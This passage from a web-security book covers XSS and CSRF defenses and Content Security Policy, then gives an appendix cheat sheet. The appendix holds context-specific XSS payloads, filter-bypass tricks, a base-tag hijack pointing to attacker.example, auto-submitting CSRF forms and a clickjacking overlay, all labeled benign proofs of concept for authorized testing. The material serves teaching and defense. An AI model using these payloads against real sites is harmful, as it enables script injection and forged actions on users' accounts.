1. **Context-appropriate output encoding** — the primary, near-universal fix for injection/XSS.
2. **Safe APIs by construction** — frameworks and sinks that don't allow injection in the first
   place (`textContent`, parameterized templates, Trusted Types).
3. **Input validation** — allow-list expected formats as a *secondary* measure.
4. **HTML sanitization** — for the special case where you must allow *some* user HTML.
5. **Content Security Policy** ([Chapter 19](#19-csp)) — defense in depth that limits impact
   when the above fail.
6. **Security headers & cookie flags** — reduce blast radius and enable browser protections.

The rest of this chapter works through 1–4 and 6; CSP gets its own chapter.

## 18.2 Output encoding is contextual (the core doctrine)

From [Chapter 2](#02-html-refresher): the right encoding depends entirely on the
context where data lands. "Encode everything" is not a plan; "encode *for the context*" is. The
canonical contexts and their encodings:

| Context | Example | Required encoding |
|---|---|---|
| HTML element content | `<div>DATA</div>` | HTML-entity encode `< > & " '` |
| Quoted attribute value | `<input value="DATA">` | HTML-entity encode (esp. the quote in use) |
| Unquoted attribute value | `<input value=DATA>` | **Don't.** Always quote attributes; then entity-encode |
| URL in `href`/`src` | `<a href="DATA">` | URL-validate (scheme allow-list) **then** attribute-encode |
| JavaScript string | `<script>var x="DATA"</script>` | JavaScript string escaping (`\xHH`/unicode), not HTML-entity |
| CSS value | `<div style="width:DATA">` | CSS escaping; better: don't put untrusted data in CSS |
| HTML comment | `<!-- DATA -->` | Don't place untrusted data here |

Two failure modes this table prevents:
- **Right idea, wrong context:** HTML-encoding a value that lands in a `<script>` or `href`
  (Chapter 8) — encoding the wrong characters does nothing useful there.
- **Unquoted attributes:** even encoded data can break out of an unquoted attribute via a space;
  always quote.

The practical rule for developers: **encode at the point of output, choosing the encoder for the
exact sink.** Mature template engines provide context-aware auto-escaping that does this for you
(§18.4).

## 18.3 Why "input sanitization" is the wrong primary defense

A common but fragile approach is to "clean" input on the way in (strip `<script>`, remove
quotes). This fails because:

- **Context isn't known at input time.** The same value may later be rendered in element content,
  an attribute, a script, and a URL — each needs different treatment.
- **Blocklists have holes** (Chapter 14's whole catalog).
- **It corrupts legitimate data** (a user named `O'Brien`, a comment about `<html>`).
- **Second-order bugs slip through** (Chapter 9): data deemed "clean" is later rendered unsafely.

Input *validation* (allow-listing expected formats) is valuable as defense in depth, but it is
**not a substitute** for output encoding. Encode on output, validate on input, never rely on
input cleaning alone.

## 18.4 Lean on framework auto-escaping — and don't disable it

Modern frameworks encode by default in templates:

- **React** escapes values in JSX by default; the danger is `dangerouslySetInnerHTML`.
- **Angular** treats interpolated values as untrusted and escapes them; danger is
  `bypassSecurityTrust*` and `[innerHTML]` with unsanitized data.
- **Vue** escapes `{{ }}` interpolation; danger is `v-html`.
- **Server-side templates** (Jinja2, Twig, Razor, ERB, Go `html/template`, Thymeleaf, etc.)
  auto-escape — *if* you don't use their "raw"/`|safe`/`{{{ }}}`/`Html.Raw` escape hatches.

**The recurring vulnerability is the escape hatch.** When you (as a tester) see
`dangerouslySetInnerHTML`, `v-html`, `|safe`, `{% autoescape false %}`, `Html.Raw`, or
`mark_safe` applied to data with any user influence, flag it. As a developer, never feed
untrusted data to these without sanitizing first (§18.6). Notably, Go's `html/template` is
*context-aware* — it picks the right encoding for element/attribute/JS/URL contexts
automatically — which is the gold standard to emulate.

## 18.5 Safe DOM APIs (client-side)

For client-rendered content (the DOM-XSS surface, Chapter 10), choose sinks that can't inject:

- **Use `textContent`/`innerText`** instead of `innerHTML` for text.
- **Build nodes with DOM APIs** (`createElement`, `append`, `setAttribute` for non-URL attrs)
  rather than HTML string concatenation.
- **For URLs**, validate the scheme before assigning to `href`/`src`/`location` (§18.7).
- **Never** pass untrusted strings to `eval`, `Function`, `setTimeout`/`setInterval` (string
  form), or `document.write`. Parse JSON with `JSON.parse`.
- **Validate `postMessage`**: check `event.origin` against an allow-list and validate the data
  shape.

The structural enforcement of all this is **Trusted Types** (§18.9 / Chapter 19), which makes the
dangerous sinks refuse raw strings.

## 18.6 Sanitizing rich text the right way

Some features legitimately need to render user HTML (comments, WYSIWYG, markdown). Here you can't
just encode — you must allow *some* tags. Rules:

1. **Never hand-roll a sanitizer.** Use a **vetted, actively maintained** library designed for
   this. On the client, the widely used choice is **DOMPurify**; server-side, use a
   well-maintained allow-list sanitizer for your language (e.g., OWASP Java HTML Sanitizer, or
   ammonia/bleach-style libraries — verify current maintenance status for your stack).
2. **Allow-list, don't block-list** tags and attributes. Start from "nothing allowed" and add the
   minimum (`<b>`, `<i>`, `<a href>` with scheme checks, `<p>`, lists...).
3. **Be aware of mutation XSS** (Chapter 3): choose a sanitizer hardened against mXSS and keep it
   updated; mXSS bypasses are found and fixed over time.
4. **Sanitize as close to output as possible**, and **re-sanitize if you transform** the HTML
   afterward (linkify, image-proxy rewriting) — post-processing can reintroduce vulnerabilities
   (Chapter 9).
5. **Handle SVG/foreign content explicitly** (Chapter 14) — many sanitizers need configuration to
   safely allow or strip SVG.
6. **Pair with CSP and Trusted Types** so a sanitizer bypass isn't game over.

For **markdown**, configure the renderer to **not** pass through raw HTML (or to run its output
through a sanitizer), and validate link schemes so `[x](javascript:...)` can't produce a
dangerous `href`.

## 18.7 URL/scheme validation

Whenever untrusted data becomes a URL (in `href`, `src`, `action`, `formaction`, redirects,
`location`):

- **Allow-list schemes**: typically permit only `http`, `https`, `mailto` (and `tel` where
  relevant); **reject** `javascript:`, `data:`, `vbscript:`, and unknown schemes.
- **Canonicalize first** (decode entities/encodings, trim whitespace/control chars) so tricks
  like `java\tscript:` or `javascript&#58;` can't slip through after your check.
- **For redirects**, allow-list destinations (or use server-side mapping keys) rather than
  reflecting an arbitrary `returnUrl` — this kills open redirect and its escalations
  (Chapter 10).
- **After** scheme validation, still apply the surrounding context's encoding (e.g.,
  attribute-encode the validated URL).

## 18.8 CSRF defenses (consolidated)

From [Chapter 11](#11-csrf), the layered fix:

- **Anti-CSRF tokens:** unpredictable, **bound to the user's session**, validated server-side on
  **every** state-changing request, and **rejected when missing or empty** (not merely "checked
  if present").
- **`SameSite` cookies:** default session cookies to `SameSite=Lax` (or `Strict` where UX
  allows). Avoid `SameSite=None` unless genuinely cross-site; if used, pair with tokens.
- **No state changes over GET.** Use POST/PUT/DELETE with protection.
- **Validate `Origin`/`Referer`** server-side and **fail closed** on cross-site or missing-header
  conditions for sensitive actions.
- **Require non-forgeable request shapes** for sensitive APIs (enforced JSON content type + a
  custom header) so plain HTML forms can't reproduce them.
- **Re-authenticate** for the highest-impact actions (password/email change, large transfers).
- **Cover the login form too** (login CSRF).

## 18.9 Framing, headers, and cookie flags (consolidated)

Browser-enforced controls that reduce impact and block whole attack classes:

- **`Content-Security-Policy: frame-ancestors 'none'|'self'|<list>`** — anti-clickjacking
  (Chapter 12); add **`X-Frame-Options: DENY/SAMEORIGIN`** for legacy browsers.
- **`X-Content-Type-Options: nosniff`** — stops MIME sniffing turning uploads/echoes into HTML
  (Chapter 14).
- **Correct `Content-Type`** with explicit `charset=utf-8`; serve APIs as JSON, downloads with
  `Content-Disposition: attachment`, user files from a **separate origin** (Chapter 14).
- **Cookie flags:** `HttpOnly` (hide session cookies from JS — limits XSS looting),
  `Secure` (HTTPS only), `SameSite` (CSRF). Prefer cookies over `localStorage` for session tokens
  (Chapter 13).
- **`Strict-Transport-Security` (HSTS)** — enforce HTTPS (supports cookie `Secure` and prevents
  downgrade).
- **`Referrer-Policy`** — limit token/secret leakage via `Referer`.
- **CSP** generally (Chapter 19) — the big one for XSS impact reduction.

## 18.10 Trusted Types: structurally killing DOM XSS

Reiterated from Chapter 10 because it's the strongest client-side fix:
`Content-Security-Policy: require-trusted-types-for 'script'` makes dangerous DOM sinks
(`innerHTML`, `script.src`, etc.) reject plain strings; data must pass through a named
**Trusted Types policy** you define (typically wrapping a sanitizer like DOMPurify). This turns a
sprawling, hard-to-audit set of sinks into a small number of central, reviewable policies — the
difference between "hope no one wrote an unsafe `innerHTML`" and "the browser enforces that they
can't." Adopt it for high-risk apps; full coverage in [Chapter 19](#19-csp).

## 18.11 Building secure features: worked patterns

**Displaying a username (element content):**
```jsx
// React — safe by default
<span>{username}</span>          // auto-escaped; no action needed
```
```python
# Jinja2 — safe by default
<span>{{ username }}</span>      {# autoescaped; do NOT add |safe #}
```

**Rendering a user-supplied link (URL context):**
```js
const ALLOWED = new Set(['http:', 'https:', 'mailto:']);
function safeHref(raw) {
  try {
    const u = new URL(raw, location.origin);   // canonicalize
    return ALLOWED.has(u.protocol) ? u.href : '#';
  } catch { return '#'; }
}
anchor.setAttribute('href', safeHref(userInput));
```

**Rendering rich text (must allow some HTML):**
```js
// Client-side, with DOMPurify + (ideally) a Trusted Types policy
container.innerHTML = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href'],
});
// Plus: validate href schemes, serve under a strict CSP.
```

**Protecting a state-changing endpoint (CSRF):**
- Generate a session-bound token; embed it in the form; verify on the server; reject if
  missing/empty/mismatched. Set the session cookie `HttpOnly; Secure; SameSite=Lax`. Don't accept
  the action over GET.

## 18.12 Remediation advice for reports

When you write remediation in a finding (Chapter 15), be **specific to the stack and context**:

- Don't write "sanitize input." Write: "HTML-entity-encode this value, which is rendered in HTML
  element content; in this Jinja2 template, remove the `|safe` filter so auto-escaping applies."
- For DOM XSS: "Replace `el.innerHTML = userVal` with `el.textContent = userVal`; if HTML is
  required, run it through DOMPurify and adopt a Trusted Types policy."
- For CSRF: "Add a session-bound anti-CSRF token validated server-side and rejected when absent;
  set `SameSite=Lax` on the session cookie."
- For clickjacking: "Add `Content-Security-Policy: frame-ancestors 'none'` (and
  `X-Frame-Options: DENY`) to responses for this sensitive page."

Specific, contextual remediation is what gets bugs actually fixed.

---

## Key takeaways

- The primary fix for injection/XSS is **context-appropriate output encoding at the point of
  output** — not input cleaning, and not "encode everything."
- **Lean on framework auto-escaping**; the recurring bug is the **escape hatch**
  (`dangerouslySetInnerHTML`, `v-html`, `|safe`, `Html.Raw`). Go's context-aware `html/template`
  is the model.
- Use **safe DOM APIs** (`textContent`, DOM construction, no `eval`); validate `postMessage`.
- For rich text, use a **vetted allow-list sanitizer** (e.g., DOMPurify) close to output,
  re-applied after transforms, and pair it with CSP/**Trusted Types**.
- **Validate URL schemes** (allow-list, canonicalize first) to kill `javascript:`/open-redirect.
- Layer **CSRF tokens + `SameSite`**, **framing controls**, **`nosniff`/correct content types**,
  and **cookie flags**. Write **stack-specific** remediation in reports.

---

<a id="19-csp"></a>

# Chapter 19 — Content Security Policy in Depth

> Content Security Policy is the browser-enforced safety net for when output encoding fails.
> It can't fix a bug, but it can stop a bug from becoming a breach. Testers need to read CSP to
> judge a finding's real impact; defenders need to write CSP that actually mitigates rather than
> merely existing. This chapter does both.

---

## 19.1 What CSP is and what it is not

CSP is an HTTP response header (`Content-Security-Policy`) — or a `<meta http-equiv>` equivalent —
that tells the browser which sources of content are allowed and which behaviors are forbidden.
Its headline benefit for this book: a well-built CSP can **prevent injected script from
executing** even when an XSS injection point exists.

What CSP **is not**:
- It is **not** a substitute for output encoding (Chapter 18). It's *defense in depth*.
- It does **not** fix the underlying injection; it limits the consequences.
- A weak/misconfigured CSP can provide **false comfort** — and is itself a finding.

## 19.2 Syntax and the directives that matter

A CSP is a series of directives separated by semicolons; each names a directive and its allowed
sources:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
```

Directives most relevant to HTML attacks:

| Directive | Controls | Why it matters here |
|---|---|---|
| `default-src` | fallback for most fetch directives | baseline; doesn't cover everything (e.g., not `frame-ancestors`/`base-uri`) |
| `script-src` | where scripts may load/execute | the heart of XSS mitigation |
| `object-src` | `<object>/<embed>/<applet>` | set to `'none'` to kill plugin/legacy vectors |
| `base-uri` | allowed `<base href>` | set to `'none'`/`'self'` to stop `<base>` hijack (Chapter 5/7) |
| `frame-ancestors` | who may frame this page | anti-clickjacking (Chapter 12) |
| `frame-src`/`child-src` | what this page may frame | limits malicious embedding |
| `img-src`,`connect-src`,`style-src`,`font-src` | other resource types | constrain exfiltration (e.g., dangling-markup `<img>`, beacons) |
| `form-action` | where forms may submit | stop `formaction`/hijacked submissions exfiltrating |
| `require-trusted-types-for` / `trusted-types` | DOM sink enforcement | structurally blocks DOM XSS (Chapter 10) |

Source expressions you'll see: `'self'`, `'none'`, specific origins, `'unsafe-inline'`,
`'unsafe-eval'`, `'nonce-...'`, `'sha256-...'`, `'strict-dynamic'`.

## 19.3 The two big weaknesses: `'unsafe-inline'` and `'unsafe-eval'`

These two source keywords are where most CSPs fail to mitigate XSS:

- **`'unsafe-inline'`** allows inline `<script>` and inline event handlers (`onclick=...`) to run.
  A `script-src` that includes `'unsafe-inline'` provides **essentially no XSS protection**,
  because the classic injected `<script>`/`onerror`/`onload` payloads are exactly inline scripts.
  As a tester, if you see `'unsafe-inline'` in `script-src`, note that the CSP does **not**
  mitigate reflected/stored XSS.
- **`'unsafe-eval'`** allows `eval`, `Function`, and string `setTimeout`. Its presence keeps
  `eval`-based DOM XSS (Chapter 10) viable. Absence neutralizes those sinks.

So the *presence* of an XSS bug under a CSP with `'unsafe-inline'` is still a high-severity
finding; under a strict CSP (no `'unsafe-inline'`), the same injection may be **non-executing**,
which legitimately lowers severity — but report both the bug *and* the CSP weakness.

## 19.4 Doing it right: nonces, hashes, and `strict-dynamic`

A CSP that actually stops XSS avoids `'unsafe-inline'` and instead authorizes *specific* scripts:

- **Nonce-based:** the server emits a random per-response nonce and tags its legitimate scripts:
  ```
  Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'
  ```
  ```html
  <script nonce="r4nd0m"> /* trusted inline script */ </script>
  ```
  An attacker who injects a `<script>` can't guess the nonce, so their script won't run. The
  nonce **must be unpredictable and unique per response** — a static or reused nonce is broken
  (and a finding).

- **Hash-based:** instead of a nonce, allow specific inline scripts by their hash
  (`'sha256-...'`). Good for static inline scripts.

- **`'strict-dynamic'`:** lets a nonce/hash-trusted script load further scripts it creates, while
  ignoring host allow-lists. This makes nonce-based policies practical for apps that load scripts
  dynamically, and it sidesteps the well-known weakness of **host allow-list bypasses** (§19.5).

The modern recommendation (echoing Google's CSP guidance) is a **nonce + `'strict-dynamic'`**
policy with `object-src 'none'` and `base-uri 'none'`, rather than long host allow-lists.

## 19.5 Why host allow-lists are weak

Older CSPs allow-list domains: `script-src 'self' https://cdn.example ...`. These are commonly
bypassable because allow-listed origins often host dangerous content:

- **JSONP endpoints** on an allow-listed domain can be abused to execute attacker-chosen
  callbacks.
- **Open redirects** on an allow-listed origin can shuttle to attacker content.
- **Outdated libraries / Angular-style template gadgets** hosted on the allow-listed CDN can be
  leveraged.
- Large CDNs host *so much* that "allow this CDN" effectively allows a lot.

As a tester, when you see a host allow-list CSP, check the allow-listed origins for JSONP, open
redirects, and known gadgets — a CSP "bypass" is often just abusing what's already trusted. As a
defender, prefer nonces + `'strict-dynamic'` over host lists.

## 19.6 Beyond script: locking down the rest

A robust policy doesn't stop at `script-src`:

- **`object-src 'none'`** — removes `<object>/<embed>` vectors; recommended almost universally.
- **`base-uri 'none'` (or `'self'`)** — prevents injected `<base>` from hijacking relative URLs
  and (in some setups) defeating nonce strategies.
- **`frame-ancestors 'none'|'self'|<list>`** — clickjacking defense (Chapter 12).
- **`form-action 'self'`** — stops injected/overridden form actions from exfiltrating to
  attacker servers.
- **`connect-src`/`img-src`** — constrain where data can be sent, blunting exfiltration (including
  dangling-markup `<img>` and beacons, Chapter 7).
- **`require-trusted-types-for 'script'; trusted-types <policies>`** — DOM-XSS structural defense
  (§19.8).

## 19.7 Report-only mode and deployment

`Content-Security-Policy-Report-Only` enforces nothing but **reports violations** to a configured
endpoint (`report-to`/`report-uri`). It's the safe way to roll out a policy: deploy report-only,
watch what *would* break, tune, then switch to enforcing. For testers: a **report-only** header
provides **no protection** — if that's all that's present, the app is effectively unprotected
despite "having a CSP." Note that distinction explicitly.

## 19.8 Trusted Types via CSP (DOM-XSS structural defense)

The CSP directives:

```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types default dompurify
```

- **`require-trusted-types-for 'script'`** makes dangerous DOM sinks (`innerHTML`, `outerHTML`,
  `script.src`, `document.write`, etc.) throw when assigned a plain string.
- **`trusted-types`** names the allowed policy factories; code must route HTML through a defined
  policy (commonly one wrapping DOMPurify) that returns a `TrustedHTML` object.

The effect (Chapter 10): the diffuse, hard-to-audit DOM-XSS sink surface collapses into a few
central, reviewable policies the browser *enforces*. This is the most effective DOM-XSS mitigation
available. As a tester, its presence sharply reduces DOM-XSS exploitability; its absence on a
high-risk app is a defense-in-depth recommendation.

## 19.9 Reading a CSP as a tester (procedure)

When you find a CSP, evaluate it:

1. **Is it enforcing or report-only?** Report-only = no protection.
2. **`script-src`:** Does it include `'unsafe-inline'`? (→ no XSS mitigation.) `'unsafe-eval'`?
   (→ `eval` DOM XSS viable.) Nonce/hash present and **unpredictable/unique**? `'strict-dynamic'`?
3. **Host allow-list?** Inspect allow-listed origins for JSONP/open-redirect/gadget bypasses.
4. **`object-src`/`base-uri`/`frame-ancestors`/`form-action`** set restrictively?
5. **Trusted Types** required?
6. **Coverage:** is the header on *all* responses (including the ones with your injection), or
   just the home page?

Then state the impact precisely: e.g., "Stored XSS executes despite CSP because `script-src`
includes `'unsafe-inline'`," or "Reflected injection is present but non-executing under the
nonce-based CSP; however, `base-uri` is unset, enabling `<base>` hijack."

## 19.10 A solid baseline policy

A strong, modern starting point (tune to the app):

```
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  form-action 'self';
  require-trusted-types-for 'script';
  trusted-types default;
  report-to csp-endpoint
```

Notes:
- Replace `{RANDOM}` with a fresh, unpredictable per-response nonce; tag all first-party scripts.
- Add specific `img-src`/`connect-src`/`style-src` as the app requires, keeping them tight.
- Roll out via **report-only first**, then enforce.
- This single header mitigates the bulk of XSS execution, `<base>` hijack, clickjacking, and
  plugin vectors at once — which is why CSP is the capstone defense.

## 19.11 The limits of CSP (keep expectations honest)

- CSP doesn't stop **CSRF** (different mechanism — `form-action` helps with exfiltration, not the
  forged request itself).
- CSP doesn't stop **non-script HTML injection** outcomes like content spoofing/phishing text
  (though it constrains exfiltration channels).
- CSP can be **bypassed** when misconfigured (`'unsafe-inline'`, weak host lists, dangling-markup
  within allowed `img-src`, etc.).
- CSP is **defense in depth** — the bug still needs fixing at the source (Chapter 18).

State these limits when recommending CSP so it isn't treated as a silver bullet.

## 19.12 Lab exercise

Using your `lab.html` (Chapter 17) or a local app:

1. Add `script-src 'unsafe-inline'` and confirm your XSS still fires — observe that this CSP
   doesn't mitigate.
2. Switch to a **nonce-based** `script-src` (no `'unsafe-inline'`), tag the legitimate script with
   the nonce, and confirm injected inline scripts/handlers no longer execute.
3. Add `base-uri 'none'` and `object-src 'none'`; test a `<base>` hijack and an `<object>` vector
   being blocked.
4. Add `require-trusted-types-for 'script'` and watch `innerHTML` assignments throw; then route
   HTML through a DOMPurify-backed Trusted Types policy and see it work safely.
5. Try a **host allow-list** CSP and, conceptually, identify how a JSONP/open-redirect on an
   allowed origin would bypass it — reinforcing why nonces + `strict-dynamic` are preferred.

---

## Key takeaways

- CSP is **browser-enforced defense in depth**: it can make an XSS injection **non-executing**,
  but it doesn't fix the bug — encode at the source (Chapter 18).
- **`'unsafe-inline'`** (and `'unsafe-eval'`) gut CSP's XSS protection; their presence means the
  bug is still exploitable and is itself a finding.
- Strong policies use **nonces + `'strict-dynamic'`**, `object-src 'none'`, `base-uri 'none'`,
  `frame-ancestors`, and `form-action` — not fragile **host allow-lists** (JSONP/open-redirect/
  gadget bypasses).
- **`require-trusted-types-for 'script'`** is the strongest **DOM-XSS** structural mitigation.
- **Report-only** mode protects nothing; check enforcement and **coverage on all responses**.
  CSP doesn't stop CSRF or content-spoofing text.

---

<a id="A-cheatsheets"></a>

# Appendix A — Payload and Encoding Cheat Sheets

> Quick reference for authorized testing. Every payload here is a **benign proof of concept**
> using `alert(document.domain)` or equivalent harmless signals. Use only against systems you own
> or are authorized to test ([Chapter 1](#01-legal-and-ethics)). Keep payloads tagged and
> reversible; prefer the quietest signal that proves the point.

---

## A.1 The context → break-out quick table

The master skill: identify the context, emit what *ends* it, then inject.

| Context | What ends it | First move |
|---|---|---|
| HTML element content | `<` starts a tag | inject a tag directly |
| Double-quoted attribute | `"` | `">` then inject, or add new attribute |
| Single-quoted attribute | `'` | `'>` then inject, or add new attribute |
| Unquoted attribute | space / tab / newline / `/` | space + new attribute |
| Inside a tag (between attrs) | space | add `autofocus onfocus=...` |
| Inline event handler (JS string) | `'` or `"` then `)` | `');...//` |
| `<script>` block | `</script>` (tokenizer) or JS string break | `</script>` or `";...//` |
| URL (`href`/`src`) | scheme | `javascript:...` |
| `<textarea>` / `<title>` (RCDATA) | matching end tag | `</textarea>` / `</title>` |
| `<style>` (RAWTEXT) | `</style>` | `</style>` then inject |
| HTML comment | `-->` | `-->` then inject |

## A.2 Benign XSS proof-of-concept payloads by context

**Element content**
```html
<svg onload=alert(document.domain)>
<img src=x onerror=alert(document.domain)>
<script>alert(document.domain)</script>
```

**Double-quoted attribute** (`<input value="HERE">`)
```html
"><svg onload=alert(document.domain)>
" autofocus onfocus=alert(document.domain) x="
```

**Single-quoted attribute**
```html
'><svg onload=alert(document.domain)>
' autofocus onfocus=alert(document.domain) x='
```

**Unquoted attribute** (`<input value=HERE>`)
```html
x onfocus=alert(document.domain) autofocus
```

**Inside an event handler** (`onclick="f('HERE')"`)
```js
');alert(document.domain);//
```

**Inside `<script>`** (`var q="HERE";`)
```js
";alert(document.domain);//
</script><svg onload=alert(document.domain)>
```

**URL context** (`<a href="HERE">`)
```
javascript:alert(document.domain)
javascript&#58;alert(document.domain)   <!-- entity-decoded in attribute context -->
```

**RCDATA** (`<textarea>HERE</textarea>`, `<title>HERE</title>`)
```html
</textarea><svg onload=alert(document.domain)>
</title><svg onload=alert(document.domain)>
```

## A.3 No-`<script>` event-handler vectors

Useful when `<script>` is filtered or CSP blocks inline `<script>` but not event attributes
(a misconfiguration). All fire with little/no interaction:

```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onload=alert(document.domain)>
<input autofocus onfocus=alert(document.domain)>
<select autofocus onfocus=alert(document.domain)>
<textarea autofocus onfocus=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<marquee onstart=alert(document.domain)>
<video><source onerror=alert(document.domain)></video>
<audio src onerror=alert(document.domain)>
<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>
```

## A.4 Filter-bypass primitives (mechanisms in Chapters 3 & 14)

```html
<!-- case -->
<ScRiPt>alert(document.domain)</ScRiPt>
<img src=x OnErRoR=alert(document.domain)>

<!-- whitespace / slash separators -->
<img/src=x/onerror=alert(document.domain)>
<svg	onload=alert(document.domain)>      <!-- tab between -->

<!-- recursive strip (single-pass tag removers) -->
<scr<script>ipt>alert(document.domain)</scr</script>ipt>

<!-- entity decoding in attribute/URL context -->
<a href="javascript&#58;alert(document.domain)">x</a>
<a href="&#x6a;avascript:alert(document.domain)">x</a>

<!-- protocol obfuscation -->
<a href="java&#9;script:alert(document.domain)">x</a>
<a href="JaVaScRiPt:alert(document.domain)">x</a>

<!-- comment breakout -->
--><svg onload=alert(document.domain)>

<!-- base hijack (repoint relative URLs) -->
<base href="//attacker.example/">

<!-- iframe srcdoc (entity-decoded document) -->
<iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;"></iframe>
```

## A.5 HTML entity / encoding reference

| Char | Named | Decimal | Hex |
|---|---|---|---|
| `<` | `&lt;` | `&#60;` | `&#x3C;` |
| `>` | `&gt;` | `&#62;` | `&#x3E;` |
| `&` | `&amp;` | `&#38;` | `&#x26;` |
| `"` | `&quot;` | `&#34;` | `&#x22;` |
| `'` | `&#39;` (`&apos;` in XML/HTML5) | `&#39;` | `&#x27;` |
| `/` | — | `&#47;` | `&#x2F;` |
| `:` | — | `&#58;` | `&#x3A;` |
| space | — | `&#32;` | `&#x20;` |

Reminders:
- Entities decode in **text, attribute value, and RCDATA** contexts; **not** in `<script>` /
  `<style>` (Chapter 3).
- Trailing semicolons are sometimes optional in attribute contexts, aiding bypasses.
- URL-encoding (`%3C`) and HTML-encoding (`&lt;`) are **different layers**; double-decoding bugs
  combine them.

## A.6 The canary string (encoding probe)

Submit this into each input and observe what survives / how it's encoded (Chapter 6/15):

```
zqxj'"<>`/\(){}[];:=&#
```

Interpretation:
- `<` `>` literal → tag injection plausible (element-content context).
- `"` survives in a `"`-quoted attribute → attribute breakout plausible.
- `'` survives in a `'`-quoted attribute → likewise.
- backtick survives → relevant in some attribute/template contexts.
- characters silently dropped → blocklist present; consult §A.4.

## A.7 CSRF proof-of-concept skeletons

For authorized testing of an in-scope, low-impact action; verify as an account you control.

**GET-based** (if a state change is exposed over GET — itself a finding):
```html
<img src="https://target.example/account/setting?theme=dark" alt="">
```

**POST-based (auto-submitting form):**
```html
<form action="https://target.example/account/preferences" method="POST" id="f">
  <input type="hidden" name="newsletter" value="off">
</form>
<script>document.getElementById('f').submit();</script>
```

**`text/plain` JSON-ish body (test endpoints that don't enforce content type):**
```html
<form action="https://target.example/api/pref" method="POST" enctype="text/plain" id="f">
  <input name='{"newsletter":"off","x":"' value='"}'>
</form>
<script>f.submit()</script>
```

## A.8 Clickjacking PoC skeleton

For authorized testing; set `opacity` to `0.3` while aligning, then `0` for the finished illusion.
A benign PoC just needs to **show the overlap** — you don't need to trick a real user.

```html
<style>
  iframe { position:absolute; top:0; left:0; width:1000px; height:700px; opacity:0.0; z-index:2; }
  #lure  { position:absolute; z-index:1; }
</style>
<div id="lure">Free prize — click below!</div>
<button>CLAIM</button>
<iframe src="https://target.example/sensitive-action"></iframe>
```

## A.9 DOM-XSS source/sink quick lists

**Sources:** `location.href|search|hash|pathname`, `document.URL|documentURI|baseURI`,
`document.referrer`, `window.name`, `postMessage` `event.data`, `localStorage`/`sessionStorage`,
`document.cookie`.

**Sinks:** `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write/writeln`, `eval`,
`Function(...)`, `setTimeout/​setInterval('...')`, `location`/`.href`/`assign`/`replace`,
`element.src`/`.href`, `iframe.srcdoc`, `script.src`, jQuery `$()`/`.html()`/`.append()`,
React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `bypassSecurityTrust*`.

**Safe sinks:** `textContent`, `innerText`, `setAttribute` for non-URL attrs, `JSON.parse`.

## A.10 Defensive headers quick reference (Chapters 18–19)

```
Content-Security-Policy: default-src 'self'; script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'self';
  require-trusted-types-for 'script'; trusted-types default
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubDomains
Referrer-Policy: strict-origin-when-cross-origin
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
```

## A.11 Encoding-by-context cheat (defenders)

| Sink context | Use this encoding |
|---|---|
| HTML element content | HTML-entity encode |
| Quoted attribute | HTML-entity encode (quote it!) |
| URL attribute | scheme allow-list + canonicalize, then attribute-encode |
| JavaScript string | JS string escaping (`\xHH`/unicode) |
| CSS value | CSS escaping (better: avoid untrusted data in CSS) |
| Rich text (must allow HTML) | vetted allow-list sanitizer (e.g., DOMPurify) + CSP/Trusted Types |

---

<a id="B-glossary"></a>

# Appendix B — Glossary

> Concise definitions of the terms used throughout the book, written for quick reference.
> Cross-references point to the chapter where each concept is developed.

---

**Adoption agency algorithm** — The HTML tree-construction routine that repairs misnested
formatting elements (`<b>`, `<i>`), cloning/reopening them. A reason the DOM differs from the
source. (Ch. 3)

**Allow-list (whitelist)** — A security model that permits only known-good items and rejects
everything else. Preferred over blocklists for sanitization, URL schemes, CORS origins, and CSP.
(Ch. 14, 18, 19)

**Attribute context** — A reflection landing inside an HTML attribute value; break-out depends on
the quoting (double/single/unquoted). (Ch. 2, 8)

**Blind XSS** — Stored XSS that executes in a context the attacker can't see (e.g., an admin
console or log viewer), detected via an out-of-band callback. (Ch. 9)

**Blocklist (blacklist)** — Filtering that enumerates bad items; inherently incomplete and
bypassable (case/whitespace/entity/recursive-strip tricks). (Ch. 7, 14)

**Canary string** — A probe containing many special characters submitted to learn how an app
encodes/filters input. (Ch. 6, 15; see Appendix A)

**Clickjacking (UI redressing)** — Tricking a user into clicking a sensitive control on a real
page that's invisibly framed over decoy content. (Ch. 12)

**Content spoofing** — HTML injection used to display attacker-controlled content (e.g., a fake
login prompt) on the legitimate site, without necessarily running script. (Ch. 7)

**Context (HTML)** — The parsing location where data lands (element content, attribute, script,
URL, CSS, comment, RCDATA, foreign content); determines which characters are dangerous and which
encoding is required. (Ch. 2)

**CORS (Cross-Origin Resource Sharing)** — A server opt-in that relaxes the Same-Origin Policy to
allow cross-origin *reading*. Misconfigurations (reflective origin + credentials, trusting
`null`) cause data theft. (Ch. 13)

**CSP (Content Security Policy)** — A browser-enforced policy header restricting content sources
and behaviors; defense in depth that can render injected scripts non-executing. (Ch. 19)

**CSRF (Cross-Site Request Forgery)** — Forcing a victim's browser to send an authenticated,
state-changing request to a target, abusing automatically-attached cookies. (Ch. 11)

**Dangling markup injection** — Injecting unterminated markup (e.g., an open attribute) to make
the browser send subsequent page content to an attacker — script-free data theft. (Ch. 7)

**DOM (Document Object Model)** — The live, in-memory tree the browser builds from parsed HTML;
the true target of client-side attacks and may differ from the source bytes. (Ch. 4)

**DOM-based XSS** — XSS where client-side JavaScript moves data from a source to a dangerous sink
